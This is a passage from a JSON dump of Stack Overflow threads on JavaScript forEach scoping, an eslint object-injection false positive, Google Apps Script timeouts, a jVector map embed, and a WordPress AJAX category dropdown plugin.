<code>forEach</code>:</p>\n\n<p><code>Array.prototype.some()</code> does a good job here. It tests if any array element satisfies the condition in the callback function you pass to it.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>let arr = [\"two\", \"one\", 7];\r\nlet str = 0;\r\n\r\nstr = arr.some(part =&gt; part === 'one') ? 1 : str;\r\n\r\nconsole.log('str is now: ' + str);</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"comments": [{"owner": {"reputation": 2160, "user_id": 5779083, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/3a03a01266fce3dad37d602fb834d344?s=128&d=identicon&r=PG&f=1", "display_name": "Tom", "link": "https://stackoverflow.com/users/5779083/tom"}, "edited": false, "score": 0, "creation_date": 1607710737, "post_id": 65251376, "comment_id": 115367443, "body": "This does not provide an answer to the question. Once you have sufficient <a href=\"https://stackoverflow.com/help/whats-reputation\">reputation</a> you will be able to <a href=\"https://stackoverflow.com/help/privileges/comment\">comment on any post</a>; instead, <a href=\"https://meta.stackexchange.com/questions/214173/why-do-i-need-50-reputation-to-comment-what-can-i-do-instead\">provide answers that don&#39;t require clarification from the asker</a>. - <a href=\"/review/low-quality-posts/27822957\">From Review</a>"}], "tags": [], "owner": {"reputation": 41, "user_id": 7722395, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QoHhB.jpg?s=128&g=1", "display_name": "2mighty", "link": "https://stackoverflow.com/users/7722395/2mighty"}, "is_accepted": false, "score": 0, "last_activity_date": 1607689645, "creation_date": 1607689645, "answer_id": 65251376, "question_id": 56265987, "link": "https://stackoverflow.com/questions/56265987/change-value-of-a-variable-inside-foreach-loop-make-it-available-outside-the-lo/65251376#65251376", "title": "Change value of a variable inside foreach loop? Make it available outside the loop", "body": "So I had this challenge where I needed to await a query in a forEach loop and it was giving me issues. So I just had to use a for...of instead of forEach.\n<pre><code>let answers = [\n    {\n        questionId: &quot;questionId1&quot;,\n        answer: &quot;answer1&quot;,\n    },\n    {\n        questionId: &quot;questionId2&quot;,\n        answer: &quot;answer2&quot;,\n    }\n]\n</code></pre>\n<p>Now I used a forEach loop and I needed to query inside the forEach loop. So what I did was use a for of instead of forEach like</p>\n<p>Previously</p>\n<pre><code>let score = 0\nlet question\nanswers.forEach(async(obj) =&gt; {\n    // Query obj.questionId here\n    question = await Question.findOne({id: obj.questionId)\n    if(obj.answer == question.answer){\n        score += 1\n    }\n})\nconsole.log(score)\n</code></pre>\n<p>In my case, the above didn't work because the score being logged above prolly got executed before the response from the question queries were received.</p>\nNow\n<pre><code>let score = 0\nlet question\nfor(obj of answers){\n    question = await Question.findOne({id: obj.questionId)\n    if(obj.answer == question.answer){\n        score += 1\n    }\n}\nconsole.log(score)\n</code></pre>\nIn the end I was happy and that's all I needed to do. So why not use for of instead of forEach and be happy too. Lol\n"}], "owner": {"reputation": 2772, "user_id": 1907888, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/QisuQ.png?s=128&g=1", "display_name": "Robert Sinclair", "link": "https://stackoverflow.com/users/1907888/robert-sinclair"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6032, "favorite_count": 0, "accepted_answer_id": 56266004, "answer_count": 4, "score": 1, "last_activity_date": 1607689645, "creation_date": 1558565697, "question_id": 56265987, "link": "https://stackoverflow.com/questions/56265987/change-value-of-a-variable-inside-foreach-loop-make-it-available-outside-the-lo", "title": "Change value of a variable inside foreach loop? Make it available outside the loop", "body": "<p>I'm setting an initial flag then doing a foreach which changes the flag to a different value but outside the foreach loop I still see the original flag. As if nothing changed. But it did change inside the foreach loop</p>\n\n<p>The value is only changed inside the foreach loop, but not outside of it..</p>\n\n<p>I saw a number of similar questions but they all deal with the actual array values, in this case it's a simple variable outside of the foreach loop.</p>\n\n<pre><code>    var arr = [\"one\"];\n\n    var str = 0;\n\n    arr.forEach(function(part){\n\n        if(part == 'one') {\n            var str = 1;\n            console.log('str changed to: ' + str);\n        }\n\n    })\n\n    console.log('str is now: ' + str);\n</code></pre>\n\n<p>This will return</p>\n\n<pre><code>str changed to: 1\nstr is now: 0\n</code></pre>\n\n<p>Based on my PHP logic above should return \"<strong>str is now: 1</strong>\", why does it have the original value of 0?</p>\n"}, {"tags": ["javascript", "security", "ecmascript-6"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1558567294, "post_id": 56265964, "comment_id": 99148538, "body": "You&#39;re only subject to object injection when <code>k</code> comes from an untrusted source and there are properties that shouldn&#39;t normally be exposed."}], "answers": [{"comments": [{"owner": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558573058, "post_id": 56266225, "comment_id": 99149512, "body": "Right, I read that a few minutes before posting this. But it seems like an odd oversight for eslint to error on one but not the other."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558622997, "post_id": 56266225, "comment_id": 99169988, "body": "It warns about object injection whenever it sees an object being accessed using square brackets with a variable index. There are no variable indexes in the second version."}, {"owner": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558633277, "post_id": 56266225, "comment_id": 99174858, "body": "Then it seems like one has a possible but unlikely vulnerability while the other has no vulnerability"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558636295, "post_id": 56266225, "comment_id": 99176055, "body": "Neither of them has a vulnerability, since they&#39;re just two ways of doing the same thing. Square brackets are only an injection vulnerability if the index comes from the user."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558636375, "post_id": 56266225, "comment_id": 99176086, "body": "That&#39;s generally true of all types of &quot;injection&quot; vulnerabilities. They&#39;re only a problem when you use user input in unsafe ways."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558636431, "post_id": 56266225, "comment_id": 99176108, "body": "That&#39;s why this is a false positive: eslint can&#39;t determine that <code>k</code> is safe."}, {"owner": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558724064, "post_id": 56266225, "comment_id": 99208647, "body": "But the second one doesn&#39;t use square bracket (with a string value that could come from a malicious actor) notation at all -- since those values are only allowed to be numbers it seems safer"}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558725907, "post_id": 56266225, "comment_id": 99209319, "body": "The first one uses square brackets, but not with user input, so there&#39;s no possible injection."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "edited": false, "score": 0, "creation_date": 1558725961, "post_id": 56266225, "comment_id": 99209333, "body": "In one case it can be determined through static analysis that there&#39;s no injection possibility, in the other case it requires data flow analysis. That&#39;s hard for the computer, but easy for the programmer."}], "tags": [], "owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "is_accepted": true, "score": 0, "last_activity_date": 1558726104, "last_edit_date": 1558726104, "creation_date": 1558567601, "answer_id": 56266225, "question_id": 56265964, "link": "https://stackoverflow.com/questions/56265964/is-object-entries-vulnerable-to-object-injection-attacks/56266225#56266225", "title": "Is Object.entries vulnerable to object injection attacks?", "body": "<p>The two methods are equivalent. The difference is that in the second case, simple static analysis can determine that there's no object injection, since there's no use of a variable in the object index. In the first case, eslint can't tell that <code>k</code> is a safe index, but we can tell it easily because <code>Object.keys()</code> doesn't return user input.</p>\n\n<p>The warning in the first version is a false positive. Object injection only occurs when the key comes from an untrusted source, since it allows them to access any property of the object. But if you're generating the list of properties in your code, it's not injection. The false positives happen because eslint doesn't know where <code>k</code> comes from in <code>foo[k]</code>, so it assumes the worst.</p>\n\n<p>Read <a href=\"https://github.com/nodesecurity/eslint-plugin-security/blob/master/docs/the-dangers-of-square-bracket-notation.md\" rel=\"nofollow noreferrer\">The Dangers of Square Bracket Notation</a></p>\n\n<p>If your intent is to process all the properties, then there's no object injection when you get <code>k</code> from <code>Object.keys()</code>. And for the same reason, there's no object injection when you use <code>Object.entries()</code>, since it's getting the same keys and values.</p>\n"}], "owner": {"reputation": 36339, "user_id": 30946, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/350f30695a2ab75b99d3fce947e856b9?s=128&d=identicon&r=PG", "display_name": "jcollum", "link": "https://stackoverflow.com/users/30946/jcollum"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 203, "favorite_count": 0, "accepted_answer_id": 56266225, "answer_count": 1, "score": 0, "last_activity_date": 1558726104, "creation_date": 1558565536, "question_id": 56265964, "link": "https://stackoverflow.com/questions/56265964/is-object-entries-vulnerable-to-object-injection-attacks", "title": "Is Object.entries vulnerable to object injection attacks?", "body": "<p>Let's say I want to build a table out of the key/values in a hash (not what I was doing, but similar enough). This is some code that would be delivered as part of a web page. The first version I wrote was like so: </p>\n\n<pre><code>let table = ''; \nObject.keys(foo).forEach(k =&gt; \n   // eslint-disable-next-line security/detect-object-injection\n   table += `||${k}|${foo[k]}||\\n`\n);\n</code></pre>\n\n<p>This triggered eslint's object injection error (which gives a lot of false positives but this object isn't coming from client input so it seems safe). But I wanted to try and refactor to get rid of the object injection issue:  </p>\n\n<pre><code>let table = ''; \nObject.entries(foo).forEach(kv =&gt;  table += `||${kv[0]}|${kv[1]}||\\n`  );\n</code></pre>\n\n<p>That got rid of the <code>security/detect-object-injection</code> problem according to eslint. But I wanted to make sure and I can't find any discussion of how to work around this on here. </p>\n\n<p>Is Object.entries better for iterating a hash (and values) vs. Object.keys when it comes to object injection? </p>\n"}, {"tags": ["javascript", "google-apps-script", "simplify"], "answers": [{"tags": [], "owner": {"reputation": 109, "user_id": 11209950, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-7PE6a19SVIY/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rc2A3RIN33M9bENzvLKvs4cw_r0Ng/mo/photo.jpg?sz=128", "display_name": "Scot May", "link": "https://stackoverflow.com/users/11209950/scot-may"}, "is_accepted": false, "score": 1, "last_activity_date": 1558574984, "creation_date": 1558574984, "answer_id": 56266961, "question_id": 56265945, "link": "https://stackoverflow.com/questions/56265945/google-apps-script-timing-out-needs-simpler-approach/56266961#56266961", "title": "Google Apps Script Timing Out (needs simpler approach)", "body": "<p>Google has a guide to best practices here:  <a href=\"https://developers.google.com/apps-script/guides/support/best-practices\" rel=\"nofollow noreferrer\">https://developers.google.com/apps-script/guides/support/best-practices</a></p>\n\n<p>I see that you are calling the SpreadsheetApp service seven times.  This is slow.  It would be better to call it once to get the data, then call it again to write the data, (if at all possible).  Also, could you use the cache service to pull the data from the spreadsheet once, and manipulate copies of it over and over for each separate user? </p>\n\n<p><a href=\"https://developers.google.com/apps-script/reference/cache/cache\" rel=\"nofollow noreferrer\">https://developers.google.com/apps-script/reference/cache/cache</a></p>\n"}, {"tags": [], "owner": {"reputation": 99, "user_id": 9487611, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-bg-LFhsoCqg/AAAAAAAAAAI/AAAAAAAAAig/KQZfGHw2WJ0/photo.jpg?sz=128", "display_name": "Peter Flickinger", "link": "https://stackoverflow.com/users/9487611/peter-flickinger"}, "is_accepted": false, "score": 0, "last_activity_date": 1558579514, "creation_date": 1558579514, "answer_id": 56267420, "question_id": 56265945, "link": "https://stackoverflow.com/questions/56265945/google-apps-script-timing-out-needs-simpler-approach/56267420#56267420", "title": "Google Apps Script Timing Out (needs simpler approach)", "body": "<p>I would first recommend going through and the <a href=\"https://developers.google.com/apps-script/guides/support/best-practices\" rel=\"nofollow noreferrer\">best practice</a>.</p>\n\n<p>That being said I did have to run a script across a few thousand sheets and developed this little bit of code to help with timeout issues. It runs a loop that times itself out, and you can set a trigger to run it ever 5 or 10 minutes. After a few hours, it will do the trick. Keep in mind that Google will eventually time you out if you do this too much, and you may have to wait a day or so till you can run it again. </p>\n\n<pre><code>function changeAll() {\n\n  var startd = new Date();\n  var diff = 0;\n\n  var start = Number(PropertiesService.getScriptProperties().getProperty(\"START\"));\n  Logger.log(start);\n\n\n\n  for(var i = start; i &lt; YOUR_MAX &amp;&amp; diff &lt; 280; i++){\n\n    //MAKE CHANGES HERE **************************************************************************\n\n\n    //END CHANGE AREA ****************************************************************************\n    //Change time and counter for next run\n    PropertiesService.getScriptProperties().setProperty(\"START\", i);\n\n    var now = new Date();\n    var difdate = (now.getTime() - startd.getTime()) * 0.001;\n    diff = difdate;\n    Logger.log(\"DIFF: \" + diff);\n\n  }\n\n}\n\n\n\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 11541967, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-mD3ohx1FMFs/AAAAAAAAAAI/AAAAAAAADww/j8gBrwXv98Q/photo.jpg?sz=128", "display_name": "Anthony Arrigo-Cutright", "link": "https://stackoverflow.com/users/11541967/anthony-arrigo-cutright"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 154, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1558579514, "creation_date": 1558565407, "last_edit_date": 1558572890, "question_id": 56265945, "link": "https://stackoverflow.com/questions/56265945/google-apps-script-timing-out-needs-simpler-approach", "title": "Google Apps Script Timing Out (needs simpler approach)", "body": "<p>I'm using this script to build statistics on each of my coworkers and it includes 15 pivot tables that frequently need to have their filters updated for different time periods. I have a lot of coworkers on this sheet, so the script for 15 tables per person ends up taking way too long and times out.</p>\n\n<p>I am including one table, but the code would have 15 iterations of this per person (<em>times 20+ people</em>). </p>\n\n<p>How can I prevent it from timing out? Either through a work around or cleaning up my code to be more efficient.</p>\n\n<pre><code>function MassUpdateofFilters() {\n    var spreadsheet = SpreadsheetApp.getActive();\n    spreadsheet.getRange('Andrew!A1').activate();\n    var sourceData = spreadsheet.getRange('Batches!1:997');\n    var pivotTable = spreadsheet.getRange('A1').createPivotTable(sourceData);\n    pivotTable.setValuesDisplayOrientation(SpreadsheetApp.Dimension.ROWS);\n    var pivotValue = pivotTable.addPivotValue(3, SpreadsheetApp.PivotTableSummarizeFunction.SUM);\n    var pivotGroup = pivotTable.addRowGroup(5);\n    pivotGroup.showTotals(false)\n        .sortDescending()\n        .sortBy(pivotTable.getPivotValues()[0], []);\n    pivotGroup = pivotTable.addRowGroup(4);\n    pivotGroup.showTotals(false);\n    var criteria = SpreadsheetApp.newFilterCriteria()\n        .setVisibleValues(['Andrew'])\n        .build();\n    pivotTable.addFilter(5, criteria);\n    criteria = SpreadsheetApp.newFilterCriteria()\n        .setVisibleValues([ '1', '2', '3', '5', '6', '7'])\n        .build();\n    pivotTable.addFilter(16, criteria);\n    criteria = SpreadsheetApp.newFilterCriteria()\n        .setVisibleValues(['April'])\n        .build();\n    pivotTable.addFilter(15, criteria);\n    criteria = SpreadsheetApp.newFilterCriteria()\n        .setVisibleValues(['2019'])\n        .build();\n    pivotTable.addFilter(17, criteria);\n};\n</code></pre>\n"}, {"tags": ["javascript", "jquery", "html", "svg", "jvectormap"], "owner": {"reputation": 25, "user_id": 11268915, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d4664dccd1f1e9193ca12e088184d94?s=128&d=identicon&r=PG&f=1", "display_name": "DakotaNZ", "link": "https://stackoverflow.com/users/11268915/dakotanz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 74, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1558568858, "creation_date": 1558565242, "last_edit_date": 1558568858, "question_id": 56265923, "link": "https://stackoverflow.com/questions/56265923/jvector-map-displays-on-website-but-code-not-showing-in-html", "title": "jVector map displays on website but code not showing in HTML", "body": "<p>I am studying web development and as part of a project I am doing I need to add an SVG map.  I have managed to add a jVector map of New Zealand but am unable to alter in in any way because the container for the map has not displayed in HTML, it only shows in dev tools when I hover over the map.  I'm not sure where I am going wrong.</p>\n\n<p>I have been trying to find an answer online but haven't found the same issue anywhere and no one on my course seems to know either.  I followed videos on you tube but did it slightly different because in the videos they put everything on the HTML page including any JS or JQuery and on my course they have said these should be kept in a separate file, so I wonder if this is causing the problem.  I did try however putting it directly into the HTML but got the same result.</p>\n\n<p><a href=\"https://i.stack.imgur.com/38Lid.png\" rel=\"nofollow noreferrer\">This shows API info displaying in Dev Tools</a>\n<a href=\"https://i.stack.imgur.com/mVadB.png\" rel=\"nofollow noreferrer\">Shows files and folders</a></p>\n\n<pre><code>&lt;!--JVECTOR SCRIPT TOP OF PAGE--&gt;\n    &lt;link rel=\"stylesheet\" href=\"assets/jsvector/jquery-jvectormap-2.0.3.css\" type=\"text/css\" media=\"all\"/&gt;\n    &lt;script src=\"assets/jsvector/jquery.js\"&gt;&lt;/script&gt;\n    &lt;script src=\"assets/jsvector/jquery-jvectormap-2.0.3.min.js\"&gt;&lt;/script&gt;\n    &lt;script src=\"assets/jsvector/jquery-jvectormap-nz-mill.js\"&gt;&lt;/script&gt;\n</code></pre>\n\n<pre><code>&lt;!--START OF JVECTOR MAP DIV EMPTY--&gt;\n               &lt;div id=\"map\"&gt;\n                &lt;/div&gt; \n\n            &lt;!--END OF JVECTOR MAP--&gt;\n</code></pre>\n\n<pre><code>//SCRIPT KEPT IN SPEARATE FILE FROM HTML BUT REFERENCING #MAP IN HTML\n$(function(){\n      $('#map').vectorMap({map: 'nz_mill'});\n    });\n</code></pre>\n\n<p>I expected to see all of the map info from the API show under the #map div in HTML like it had done on the demo videos I watched.  It has obviously connected OK but I have no way to adjust anything on it.</p>\n"}, {"tags": ["javascript", "php", "jquery", "ajax", "wordpress"], "comments": [{"owner": {"reputation": 35130, "user_id": 1255289, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5ed02658b2440179f00eeff8beb7aa4c?s=128&d=identicon&r=PG", "display_name": "miken32", "link": "https://stackoverflow.com/users/1255289/miken32"}, "edited": false, "score": 3, "creation_date": 1558564977, "post_id": 56265873, "comment_id": 99148037, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/12284168/adding-onclick-event-dynamically-using-jquery\">Adding onClick event dynamically using jQuery</a>"}, {"owner": {"reputation": 31, "user_id": 11028592, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-1QgsaWaJaa4/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQParw2Cyv0hVcsMirP010qgBdjWVA/mo/photo.jpg?sz=128", "display_name": "Mar__co", "link": "https://stackoverflow.com/users/11028592/mar-co"}, "reply_to_user": {"reputation": 35130, "user_id": 1255289, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5ed02658b2440179f00eeff8beb7aa4c?s=128&d=identicon&r=PG", "display_name": "miken32", "link": "https://stackoverflow.com/users/1255289/miken32"}, "edited": false, "score": 0, "creation_date": 1558598727, "post_id": 56265873, "comment_id": 99156189, "body": "I read the other question. Unfortunately it doesn&#39;t help me or I didn&#39;t understand. Sorry, I&#39;m still learning Javascript."}, {"owner": {"reputation": 31, "user_id": 11028592, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-1QgsaWaJaa4/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQParw2Cyv0hVcsMirP010qgBdjWVA/mo/photo.jpg?sz=128", "display_name": "Mar__co", "link": "https://stackoverflow.com/users/11028592/mar-co"}, "reply_to_user": {"reputation": 35130, "user_id": 1255289, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/5ed02658b2440179f00eeff8beb7aa4c?s=128&d=identicon&r=PG", "display_name": "miken32", "link": "https://stackoverflow.com/users/1255289/miken32"}, "edited": false, "score": 0, "creation_date": 1558601396, "post_id": 56265873, "comment_id": 99157733, "body": "I&#39;ve found a solution. I moved the jquery code for the third row into the function getCat. Now it works"}, {"owner": {"reputation": 855, "user_id": 4629519, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-Z-ptdSU_uOM/AAAAAAAAAAI/AAAAAAAABEI/UHK4WP-lx8Y/photo.jpg?sz=128", "display_name": "Grant Noe", "link": "https://stackoverflow.com/users/4629519/grant-noe"}, "edited": false, "score": 0, "creation_date": 1558636656, "post_id": 56265873, "comment_id": 99176191, "body": "@Mar__co would you like to post your solution here as an answer?"}], "answers": [{"tags": [], "owner": {"reputation": 31, "user_id": 11028592, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-1QgsaWaJaa4/AAAAAAAAAAI/AAAAAAAAAAA/ACevoQParw2Cyv0hVcsMirP010qgBdjWVA/mo/photo.jpg?sz=128", "display_name": "Mar__co", "link": "https://stackoverflow.com/users/11028592/mar-co"}, "is_accepted": false, "score": 0, "last_activity_date": 1559140849, "creation_date": 1559140849, "answer_id": 56363165, "question_id": 56265873, "link": "https://stackoverflow.com/questions/56265873/jquery-click-function-for-getting-subcat-of-id-element/56363165#56363165", "title": "Jquery .click function for getting subcat of id element", "body": "<p>Here is my full code, that works in my plugin</p>\n\n<pre><code>&lt;?php\ndefined('ABSPATH') or die(\"Thanks for visting\");\n\nif ( ! class_exists( 'frontendAjaxDdown' ) ):\n    class frontendAjaxDdown\n    {\n\n\n         // Loading WordPress hooks\n        function __construct()\n        {\n            add_action( 'avada_after_header_wrapper', array($this, 'llm_car_conf_list') );\n\n            // Register ajax action\n            add_action( 'wp_ajax_get_cat', array($this, 'getCat') );\n            add_action( 'wp_ajax_get_subcat', array($this, 'getSubCat') );\n            add_action( 'wp_ajax_get_subsubcat', array($this, 'getSubSubCat') );\n\n\n\n            // Register ajax action for non loged in user\n            add_action('wp_ajax_nopriv_get_cat', array($this, 'getCat') );\n            add_action('wp_ajax_nopriv_get_subcat', array($this, 'getSubCat') );\n            add_action('wp_ajax_nopriv_get_subsubcat', array($this, 'getSubSubCat') );\n\n\n\n        }\n\nfunction llm_car_conf_list() { \n    if ( is_front_page() ) {?&gt;\n\n        &lt;div class=\"llm_car_container\"&gt;\n           &lt;div class=\"car_wrapper\"&gt;\n             &lt;div class=\"car_row\"&gt;\n                 &lt;div class=\"car_title\"&gt;&lt;h2&gt;1. Fahrzeug w\u00e4hlen&lt;/h2&gt;&lt;/div&gt;\n                 &lt;ul id=\"maincat\" class=\"car_conf\"&gt;&lt;?php\n\n                    $categories = get_categories(array (\n                    'taxonomy'      =&gt; 'product_cat',\n                    'hide_empty'    =&gt; 1,\n                    'parent'        =&gt; 0\n                    ));\n\n                    foreach ( $categories as $category ) {\n                    printf( '&lt;li class=\"car_list_item\"&gt;&lt;a id=\"%1$s\"&gt;&lt;img src=\"http://climair-schweiz.ch.185-117-169-242.srv201.webpreview.ch/wp-content/uploads/carbrands/%2$s.png\" width=\"20px\"&gt;%2$s&lt;/a&gt;&lt;/li&gt;',\n                        esc_html ($category-&gt;term_id ),\n                        esc_html( $category-&gt;cat_name )\n                    );\n                    } ?&gt;\n                &lt;/ul&gt;\n                &lt;/div&gt;\n\n                &lt;script type=\"text/javascript\"&gt;\n                        (function($){\n                            $(\"#maincat li\").click(function(){\n                                $(\"#second_row, #third_row, #fourth_row\").empty();\n                                $.ajax({\n                                    type: \"post\",\n                                    url: \"&lt;?php echo admin_url( 'admin-ajax.php' ); ?&gt;\",\n                                    data: { action: 'get_cat', cat_id: $(this).find('a').attr('id') },\n                                    success: function(data) {\n                                        $(\"#second_row\").append(data);\n                                    }\n                                });\n                            });\n                        })(jQuery);\n                &lt;/script&gt;\n                &lt;div class=\"car_row\"&gt;\n                  &lt;div class=\"car_title\"&gt;&lt;h2&gt;2. Model w\u00e4hlen&lt;/h2&gt;&lt;/div&gt;\n&lt;ul id=\"second_row\" class=\"car_conf\"&gt;&lt;/ul&gt;\n                &lt;/div&gt;\n\n\n                &lt;div class=\"car_row\"&gt;\n                  &lt;div class=\"car_title\"&gt;&lt;h2&gt;3. Baujahr | Typ w\u00e4hlen&lt;/h2&gt;&lt;/div&gt;\n                  &lt;ul id=\"third_row\" class=\"car_conf\"&gt;&lt;/ul&gt;\n                &lt;/div&gt;\n\n                &lt;div class=\"car_row\"&gt;\n                  &lt;div class=\"car_title\"&gt;&lt;h2&gt;4. Form | T\u00fcren w\u00e4hlen&lt;/h2&gt;&lt;/div&gt;\n                  &lt;ul id=\"fourth_row\" class=\"car_conf\"&gt;&lt;/ul&gt;\n                &lt;/div&gt;\n\n           &lt;/div&gt;\n        &lt;/div&gt; &lt;?php \n    }\n}\n\nfunction getCat() {\n\n    $categories = get_categories(array (\n        'taxonomy'      =&gt; 'product_cat',\n        'hide_empty'    =&gt; 1,\n        'child_of'      =&gt; $_POST['cat_id'],\n        'parent'        =&gt; $_POST['cat_id']\n    ));\n\n    foreach ( $categories as $category ) {\n        printf( '&lt;li id=\"%1$s\" class=\"car_list_item\"&gt;&lt;a id=\"%1$s\"&gt;%2$s&lt;/a&gt;&lt;/li&gt;',\n            esc_html ($category-&gt;term_id ),\n            esc_html( $category-&gt;cat_name )\n        );\n    } ?&gt;\n    &lt;script type=\"text/javascript\"&gt;\n        (function($){\n            $(\"#second_row li\").click(function(){\n                $(\"#third_row, #fourth_row\").empty();\n                $.ajax({\n                    type: \"post\",\n                    url: \"&lt;?php echo admin_url( 'admin-ajax.php' ); ?&gt;\",\n                    data: { action: 'get_subcat', cat_id: $(this).find('a').attr('id') },\n                    success: function(data) {\n                        $(\"#third_row\").append(data);\n                    }\n                });\n\n            });\n        })(jQuery);\n    &lt;/script&gt; &lt;?php\n    